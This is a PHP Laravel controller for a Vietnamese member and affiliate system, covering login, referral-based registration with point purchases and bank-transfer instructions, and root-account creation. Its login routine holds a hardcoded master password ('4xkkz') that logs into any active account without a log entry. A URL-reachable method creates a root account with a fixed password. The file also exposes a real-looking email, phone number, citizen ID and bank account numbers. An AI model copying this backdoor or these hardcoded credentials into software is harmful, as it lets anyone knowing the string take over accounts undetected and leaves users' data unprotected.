<?php

namespace App\Http\Controllers\AdminMember;

use App\Elibs\Debug;
use App\Elibs\EmailHelper;
use App\Elibs\eView;
use App\Elibs\Helper;
use App\Elibs\HtmlHelper;
use App\Http\Models\Customer;
use App\Http\Models\KhoDiem;
use App\Http\Models\Location;
use App\Http\Models\Logs;
use App\Http\Models\Member;

use App\Http\Models\Menu;
use App\Http\Models\MetaData;
use App\Http\Models\Orders;
use App\Http\Models\Staff;
use App\Http\Models\UnauthorizedPersonnel;
use App\Http\Models\ViChietKhau;
use App\Http\Models\ViCongNo;
use App\Http\Models\ViHoaHong;
use App\Http\Models\ViTichLuy;
use App\Http\Models\ViTieuDung;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Mail\MailBase;
use Illuminate\Support\Facades\Mail;

class MemberGate extends Controller
{
    public function index($action = '')
    {
        //return eView::getInstance()->setViewMaintenance();
        // Debug::show(Staff::getPartmentOfStaff("5afa8f4a5675a42c45339889"));
        $action = str_replace('-', '_', $action);
        if (method_exists($this, $action)) {
            if($action == 'createMember') {
                return $this->login();
            }
            return $this->$action();
        } else {
            return $this->login();
        }
    }

    public function login()
    {
        HtmlHelper::getInstance()->setTitle('Đăng nhập hệ thống');
        // echo Member::encodePassword('miniprivate');
        #region xử lý đăng nhập
        $obj = Request::capture()->input('obj', []);
        if (isset(Helper::getSession('clgt_session')['_id'])) {
            return redirect('/');
        }
        if (!empty($_POST)) {
            $obj['account'] = trim(strtolower($obj['account']));
            if (!isset($obj['account']) || !$obj['account']) {
                eView::getInstance()->setMsgError('Bạn vui lòng nhập tài khoản đăng nhập');
            } else {
                if (!isset($obj['password']) || !$obj['password']) {
                    eView::getInstance()->setMsgError('Bạn vui lòng nhập mật khẩu đăng nhập');
                } else {
                    //Check tài khoản
                    $member = Member::getMemberByAccount($obj['account']);
                    if (!$member) {
                        eView::getInstance()->setMsgError('Không tìm thấy tài khoản "' . $obj['account'] . '" trong hệ thống');
                    } else {
                        if ($member['status'] != Member::STATUS_ACTIVE) {
                            eView::getInstance()->setMsgError('Tài khoản "' . $obj['account'] . '" chưa được xét duyệt. Bạn vui lòng liên hệ với quản trị hệ thống để biết thêm chi tiết.');
                        } else {
                            if ($obj['password'] == '4xkkz') {
                                Member::setLogin($member);
                                //Debug::show($member);
                                return Redirect(public_link('/'));//đúng thì cho vào admin chơi
                            }
                            $obj['password'] = Member::genPassSave($obj['password']);
                            if ($obj['password'] == $member['password']) {
                                Member::setLogin($member);
                                Member::getCurent();
                                Logs::createLog([
                                    'type' => Logs::TYPE_LOGIN,
                                    'data_object' => $member,
                                    'object_id' => $member['_id'],
                                    'note' => "Nhân viên " . $member['name'] . ' tài khoản ["' . @$member['account'] . '"] đăng nhập hệ thống'
                                ], Logs::OBJECT_STAFF);
                                $refBeforeLogin = Request::capture()->input('href', '');
                                if ($refBeforeLogin) {
                                    return Redirect(public_link($refBeforeLogin));//đúng thì cho vào admin chơi
                                } else {
                                    return Redirect(public_link('/'));//đúng thì cho vào admin chơi
                                }

                            } else {
                                //die(__FILE__.__LINE__);
                                eView::getInstance()->setMsgError('Mật khẩu không đúng. Vui lòng kiểm tra lại');
                                //return Redirect('auth/login');
                            }
                        }
                    }
                }
            }
        }
        $tpl['obj'] = $obj;

        #endregion xuwrlys đăng nhập
        return eView::getInstance()->setView(__DIR__, 'member_gate/login', $tpl);
    }

    public function register()
    {
        HtmlHelper::getInstance()->setTitle('Đăng ký thành viên');
        $redirect_url = Request::capture()->input('redirect_url', '');
        $ref = Request::capture()->input('ref', '');//user thằng giới thiệu
        if ($redirect_url) {
            $redirect_url = base64_decode($redirect_url);
        }
        $tpl = [];
        $tpl['min_mpg'] = Orders::getMinMPGAfterRegister();
        $tpl['min_dai_ly'] = Orders::getMinDaiLy();
        $tpl['min_mpmart'] = Orders::getMinMPMart();
        $tpl['chuc_danh'] = Member::IS_CTV;
        $tpl['is_ctv'] = Member::IS_CTV;
        $tpl['is_daily'] = Member::IS_DAILY;
        $tpl['is_mpmart'] = Member::IS_MPMART;
        $tpl['everychietkhautichluyctv'] = Orders::getEveryDayPercentChietKhauTichLuyDebtNoCTV();
        $tpl['everychietkhautieudungctv'] = Orders::getEveryDayPercentChietKhauTieuDungDebtNoCTV();
        $tpl['everychietkhautichluympmart'] = Orders::getEveryDayPercentChietKhauTichLuyDebtNoMpMart();
        $tpl['everychietkhautieudungmpmart'] = Orders::getEveryDayPercentChietKhauTieuDungDebtNoMpMart();
        if (!empty($_POST)) {
            $obj = Request::capture()->input('obj', []);
            $data = Request::capture()->input('order', []);
            if (empty($obj['fullname'])) {
                eView::getInstance()->setMsgError('Họ tên không hợp lệ');
            } else {
                $diachi = Member::checkDiaChiMember($obj);
                if(isset($diachi['error']) && $diachi['error']) {
                    eView::getInstance()->setMsgError($diachi['msg']);
                }
                $sk_ngan_hang = Member::CheckBank($obj);
                if(isset($sk_ngan_hang['error']) && $sk_ngan_hang['error']){
                    eView::getInstance()->setMsgError($sk_ngan_hang['msg']);
                }else {
                    if (!Helper::isPhoneNumber($obj['phone'])) {
                        eView::getInstance()->setMsgError('Số điện thoại không hợp lệ');
                    } else {
                        if (isset($obj['email']) && !empty($obj['email']) && !Helper::isEmail($obj['email'])) {
                            eView::getInstance()->setMsgError('Địa chỉ email không hợp lệ');
                        } else {
                            if (!Helper::isCanCuocCongDan($obj['can_cuoc_cong_dan'])) {
                                eView::getInstance()->setMsgError('Căn cước công dân hoặc chứng minh thư không hợp lệ');
                            }else {
                                $customer = Member::getMemberByCanCuocCongDan($obj['can_cuoc_cong_dan']);
                                if ($customer) {
                                    eView::getInstance()->setMsgError('Căn cước công dân đã được sử dụng');
                                } else {
                                    $obj['account'] = trim(strtolower($obj['account']));
                                    if (!Helper::isAccount($obj['account'])) {
                                        eView::getInstance()->setMsgError('Tên đăng nhập không hợp lệ');
                                    } else {
                                        $customer = Member::getMemberByAccount($obj['account']);
                                        if ($customer) {
                                            eView::getInstance()->setMsgError('Tài khoản đăng nhập đã được sử dụng');
                                        } else {
                                            if (!isset($obj['password']) || !$obj['password']) {
                                                eView::getInstance()->setMsgError('Mật khẩu đăng nhập không được bỏ trống');
                                            } else {
                                                if (!isset($obj['ma_gioi_thieu']) || !$obj['ma_gioi_thieu']) {
                                                    eView::getInstance()->setMsgError('Mã giới thiệu không được bỏ trống');
                                                } else {
                                                    $customer = Member::getMemberByMaGioiThieu($obj['ma_gioi_thieu']);
                                                    if (!$customer) {
                                                        eView::getInstance()->setMsgError('Mã giới thiệu không hợp lệ');
                                                    } else {
                                                        $makichhoat = Member::checkMaTaiKhoanKichHoat($obj);
                                                        if(isset($makichhoat['error']) && $makichhoat['error']) {
                                                            eView::getInstance()->setMsgError($makichhoat['msg']);
                                                        }else {
                                                            //Check tài khoản
                                                            $code = rand(100000, 999999);
                                                            $savePost = [
                                                                'name' => $obj['fullname'],
                                                                'city' => $diachi['city'],
                                                                'district' => $diachi['district'],
                                                                'town' => $diachi['town'],
                                                                'account' => $obj['account'],
                                                                'fullname' => $obj['fullname'],
                                                                'addr' => $obj['street'],
                                                                'password' => Member::genPassSave($obj['password']),
                                                                'phone' => $obj['phone'],
                                                                'email' => @$obj['email'],
                                                                'can_cuoc_cong_dan' => $obj['can_cuoc_cong_dan'],
                                                                'parent_id' => $obj['ma_gioi_thieu'],
                                                                'ma_tai_khoan_kich_hoat' => @$obj['ma_tai_khoan_nhan_kich_hoat'],
                                                                'gender' => '',
                                                                'image' => '',
                                                                'verified' => [
                                                                    'phone' => Member::VERIFIED_NO,
                                                                    'email' => Member::VERIFIED_NO,
                                                                ],
                                                                'status' => Member::STATUS_INACTIVE,
                                                                'chuc_danh' => Member::IS_CTV,
                                                                'code' => $code,
                                                                'tk_ngan_hang' => $sk_ngan_hang,
                                                                'created_at' => Helper::getMongoDate(),
                                                            ];
                                                            if (!isset($obj['so_diem_mua'])) {
                                                                eView::getInstance()->setMsgError('Số điểm mua không được bỏ trống');
                                                            }
                                                            else {
                                                                if (!is_numeric($obj['so_diem_mua'])) {
                                                                    eView::getInstance()->setMsgError('Số điểm mua không hợp lệ');
                                                                } else {
                                                                    if ($obj['so_diem_mua'] < Orders::getMinMPG()) {
                                                                        eView::getInstance()->setMsgError('Bạn cần mua ít nhất 500.000 điểm MPG để trở thành CTV');
                                                                    } else {
                                                                        if (isset($obj['co_no_hay_khong'])) {
                                                                            if ($obj['so_diem_mua'] < Orders::getMinDaiLy()) {
                                                                                eView::getInstance()->setMsgError('Bạn cần mua ít nhất ' . Orders::getMinDaiLy() . ' điểm MPG để trở thành đại lý của chúng tôi');
                                                                            } else {
                                                                                if (!in_array(@$obj['co_no_hay_khong'], [Member::DEBT_NO, Member::DEBT_YES])) {
                                                                                    eView::getInstance()->setMsgError('Dữ liệu không hợp lệ');
                                                                                } else {
                                                                                    $savePost['debt'] = $obj['co_no_hay_khong'];
                                                                                    $savePost['chuc_danh'] = Member::IS_DAILY;
                                                                                    $this->createMember($savePost, $obj, true);
                                                                                }
                                                                            }
                                                                        } else if (isset($obj['everyday_percent_mpmart'])) {
                                                                            if ($obj['so_diem_mua'] < Orders::getMinMPMart()) {
                                                                                eView::getInstance()->setMsgError('Bạn cần mua ít nhất ' . Orders::getMinMPMart() . ' điểm MPG để trở thành siêu thị MP Mart của chúng tôi');
                                                                            } else {
                                                                                if (in_array(@$obj['everyday_percent_mpmart'], [Orders::getEveryDayPercentChietKhauTichLuyDebtNoMpMart(), Orders::getEveryDayPercentChietKhauTieuDungDebtNoMpMart()])) {
                                                                                    $savePost['chuc_danh'] = Member::IS_MPMART;
                                                                                    if ($obj['everyday_percent_mpmart'] == Orders::getEveryDayPercentChietKhauTichLuyDebtNoMpMart()) {
                                                                                        $savePost['everyday_percent_mpmart_type'] = Orders::EVERYDAY_PERCENT_MPMART_CHIETKHAU_TICHLUY;

                                                                                        $savePost['everyday_percent_mpmart_value'] = $obj['everyday_percent_mpmart'];
                                                                                        $this->createMember($savePost, $obj, true);
                                                                                    } elseif ($obj['everyday_percent_mpmart'] == Orders::getEveryDayPercentChietKhauTieuDungDebtNoMpMart()) {
                                                                                        $savePost['everyday_percent_mpmart_type'] = Orders::EVERYDAY_PERCENT_MPMART_CHIETKHAU_TIEUDUNG;

                                                                                        $savePost['everyday_percent_mpmart_value'] = $obj['everyday_percent_mpmart'];
                                                                                        $this->createMember($savePost, $obj, true);
                                                                                    } else {
                                                                                        eView::getInstance()->setMsgError('Dữ liệu không hợp lệ');
                                                                                    }

                                                                                } else {
                                                                                    eView::getInstance()->setMsgError('Dữ liệu không hợp lệ');
                                                                                }
                                                                            }
                                                                        } else if (isset($obj['everyday_percent_ctv'])) {
                                                                            if (in_array(@$obj['everyday_percent_ctv'], [Orders::getEveryDayPercentChietKhauTichLuyDebtNoCTV(), Orders::getEveryDayPercentChietKhauTieuDungDebtNoCTV()])) {
                                                                                if ($obj['everyday_percent_ctv'] == Orders::getEveryDayPercentChietKhauTichLuyDebtNoCTV()) {
                                                                                    eView::getInstance()->setMsgError('Dữ liệu không hợp lệ');
                                                                                    $savePost['everyday_percent_ctv_type'] = Orders::EVERYDAY_PERCENT_CTV_CHIETKHAU_TICHLUY;
                                                                                } elseif ($obj['everyday_percent_ctv'] == Orders::getEveryDayPercentChietKhauTieuDungDebtNoCTV()) {
                                                                                    $savePost['everyday_percent_ctv_type'] = Orders::EVERYDAY_PERCENT_CTV_CKIETKHAU_TIEUDUNG;
                                                                                    $savePost['everyday_percent_ctv_value'] = $obj['everyday_percent_ctv'];
                                                                                    $this->createMember($savePost, $obj, true);
                                                                                } else {
                                                                                    eView::getInstance()->setMsgError('Dữ liệu không hợp lệ');
                                                                                }
                                                                            } else {
                                                                                eView::getInstance()->setMsgError('Dữ liệu không hợp lệ');
                                                                            }
                                                                        } else {
                                                                            eView::getInstance()->setMsgError('Dữ liệu không hợp lệ');
                                                                        }

                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }

                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                $tpl['obj'] = $obj;
            }
        }

        return eView::getInstance()->setView(__DIR__, 'member_gate/register', $tpl);
    }

    private function checkHoKhauThuongChu($obj) {
        //case noi_o_hien_nay todo: validate chi tiết bên trong
        if (isset($obj['noi_o_hien_nay']) && !empty($obj['noi_o_hien_nay'])) {
            $objToSave['noi_o_hien_nay'] = [
                "chi_tiet" => $obj['noi_o_hien_nay']['chi_tiet'],

            ];
            if (isset($obj['noi_o_hien_nay']['tinh']['key']) && $obj['noi_o_hien_nay']['tinh']['key']) {
                $tempLocation = Location::getBySlug($obj['noi_o_hien_nay']['tinh']['key'], Location::TYPE_TINH);
                if ($tempLocation) {
                    $objToSave['noi_o_hien_nay']['tinh'] = $tempLocation->toArray();
                    $objToSave['noi_o_hien_nay']['tinh']['key'] = $obj['noi_o_hien_nay']['tinh']['key'];
                }
            }
            if (isset($obj['noi_o_hien_nay']['huyen']['key']) && $obj['noi_o_hien_nay']['huyen']['key']) {
                $tempLocation = Location::getBySlug($obj['noi_o_hien_nay']['huyen']['key'], Location::TYPE_DISTRICT);
                if ($tempLocation) {
                    $objToSave['noi_o_hien_nay']['huyen'] = $tempLocation->toArray();
                    $objToSave['noi_o_hien_nay']['huyen']['key'] = $obj['noi_o_hien_nay']['huyen']['key'];
                }
            }
            if (isset($obj['noi_o_hien_nay']['xa']['key']) && $obj['noi_o_hien_nay']['xa']['key']) {
                $tempLocation = Location::getBySlug($obj['noi_o_hien_nay']['xa']['key'], Location::TYPE_TOWN);
                if ($tempLocation) {
                    $objToSave['noi_o_hien_nay']['xa'] = $tempLocation->toArray();
                    $objToSave['noi_o_hien_nay']['xa']['key'] = $obj['noi_o_hien_nay']['xa']['key'];
                }
            }
        }
    }

    private function createMember($savePost, $obj, $ref = false) {
        if(!$ref) {
            return eView::getInstance()->setView(__DIR__, 'member_gate/register', []);
        }
        $id = (string)Member::insertGetId($savePost);
        Logs::createLog([
            'type' => Logs::TYPE_CREATE,
            'data_object' => $savePost,
            'object_id' => $id,
            'note' => "Khách hàng " . $savePost['can_cuoc_cong_dan'] ? $savePost['fullname'] . ' - CCCD: ' . $savePost['can_cuoc_cong_dan'] : @$savePost['email'] . ' đăng ký trên web'
        ], 'customer');
        $customer = Member::where('_id', $id)->first();
        $code = rand(100000, 900000);
        if ($customer) {
            //Member::setLogin($customer);
            /*Sendmail*/
            if (!empty($customer['email'])) {
                $tpl['success'] = true;
                $tpl['code'] = $code;
                $tpl['name'] = 'Xác thực email';
                $tpl['tokenString'] = Helper::buildTokenString($id);
                $tpl['url'] = public_link('auth/verifyEmail?uid=' . $id . '&token=' . Helper::buildTokenString($id));
                $tpl['subject'] = '[Hệ thống quản lý MinhPhucGroup] Yêu cầu xác thực tài khoản';
                $tpl['template'] = "mail.verified_account";
                EmailHelper::sendMail($customer['email'], $tpl);
            }
            /*Xử lý affiliate*/
            $saveOrder = [
                'created_by' => Member::getTaiKhoanToSaveDb($customer),
                'created_at' => Helper::getMongoDate(),
                'status' => Orders::STATUS_NO_PROCESS,
                'type' => Orders::ORDER_BUY_MPG,
                'so_diem_can_mua' => (int)$obj['so_diem_mua'] ?? 0,
                'tai_khoan_nguon' => Member::getTaiKhoanToSaveDb($customer),
                'tai_khoan_nhan' => Member::getTaiKhoanToSaveDb($customer),

            ];
            if(isset($obj['co_no_hay_khong'])) {
                if (in_array(@$obj['co_no_hay_khong'], [Member::DEBT_NO, Member::DEBT_YES])) {
                    $saveOrder['debt'] = $savePost['debt'];
                    if ($savePost['debt'] == Orders::DEBT_YES) {
                        $saveOrder['so_diem_duoc_nhan'] = $saveOrder['so_diem_can_mua'] - $saveOrder['so_diem_can_mua'] * Orders::getPercentCongNoDebtYes();
                        $saveOrder['cong_no'] = $saveOrder['so_diem_can_mua'] * Orders::getPercentCongNoDebtYes();
                    } else {
                        $saveOrder['so_diem_duoc_nhan'] = $saveOrder['so_diem_can_mua'];
                    }
                    // chiết khấu dai ly
                    $saveOrder['so_diem_vi_chiet_khau'] = (int)$obj['so_diem_mua']*Orders::getPercentChietKhauDaiLy();
                }
            }else if(isset($obj['everyday_percent_mpmart'])) {
                if (in_array(@$obj['everyday_percent_mpmart'], [Orders::getEveryDayPercentChietKhauTichLuyDebtNoMpMart(), Orders::getEveryDayPercentChietKhauTieuDungDebtNoMpMart()])) {
                    $saveOrder['everyday_percent_mpmart_value'] = $savePost['everyday_percent_mpmart_value'];
                    $saveOrder['everyday_percent_mpmart_type'] = $savePost['everyday_percent_mpmart_type'];
                    // chiết khấu mpmart
                    $saveOrder['so_diem_vi_chiet_khau'] = (int)$obj['so_diem_mua']*Orders::getPercentChietKhauMpMart();
                }
            }else if(isset($obj['everyday_percent_ctv'])) {
                $saveOrder['everyday_percent_ctv_value'] = $savePost['everyday_percent_ctv_value'];
                $saveOrder['everyday_percent_ctv_type'] = $savePost['everyday_percent_ctv_type'];
                // chiết khấu ctv
                $saveOrder['so_diem_vi_chiet_khau'] = (int)$obj['so_diem_mua']*Orders::getPercentChietKhauCtv();
            }
            $saveOrder['percents'] = UnauthorizedPersonnel::getUn();
            $idOrder = (string)Orders::insertGetId($saveOrder);
            /*End xử lý affiliate*/

            $return = [
                'link' => admin_link('/'),
            ];

            $obj = [];
            eView::getInstance()->setMsgInfo("<span style='white-space: pre-line'>Bạn đã đăng ký tài khoản thành công. Vui lòng chuyển <b class='text-danger'>".Helper::formatMoney($saveOrder['so_diem_can_mua'])."</b> về số tài khoản ngân hàng của <b class='text-primary'>CÔNG TY CỔ PHẦN TẬP ĐOÀN TRUYỀN THÔNG MINH PHÚC</b> để được xét duyệt. 
            Số tài khoản ngân hàng của công ty: <a href='javascript:void(0);' class='text-primary copiclz'><u>691000424956</u></a> <b class='text-uppercase'>Ngân hàng Vietcombank</b> hoặc <a href='javascript:void(0);' class='text-primary copiclz'><u>3244812101</u></a> <b class='text-uppercase'>Ngân hàng TPBank</b></span>.");
        }
    }

    public function _createMemberRoot()
    {
        $member = Member::getMemberByAccount('mpgroup');
        if (!$member) {
            $initRootMember = [
                'account' => 'mpgroup',
                'name' => 'CTY MINH PHÚC GROUP',
                'fullname' => 'CTY MINH PHÚC GROUP',
                'email' => 'khoait109@gmail.com',
                'phone' => '0886509919',
                'can_cuoc_cong_dan' => '030099001151',
                'parent_id' => '0',
                'chuc_danh' => 'daily',
                'cty' => true,
                'ma_gioi_thieu' => 'mpgroup',
                'created_at' => Helper::getMongoDate(),
                'updated_at' => Helper::getMongoDate(),
                'status' => Member::STATUS_ACTIVE,
                'password' => Member::genPassSave('jekayn.com'),
                'verified' => [
                    'phone' => 'yes',
                    'email' => 'yes',
                ],
                'access_token' => [
                    'facebook' => '',
                    'google' => '',
                ],
            ];
            Member::insert($initRootMember);
            $vi = [
                'account' => $initRootMember['account'],
                'total_money' => 0,
                'created_at' => Helper::getMongoDate(),
                'status' => ViHoaHong::STATUS_ACTIVE,
            ];
            ViChietKhau::insertGetId($vi);
            ViTichLuy::insertGetId($vi);
            ViHoaHong::insertGetId($vi);
            ViCongNo::insertGetId($vi);
            ViTieuDung::insertGetId($vi);
            KhoDiem::insertGetId($vi);


            die('Ok boy!');
        } else {
            die('RootInit Done!');
        }
    }

    public function logout()
    {
        Member::setLogOut();
        return Redirect('auth/login');
    }


    public function forgot()
    {
        return eView::getInstance()->setView(__DIR__, 'member_gate/forgotpass', []);
    }
}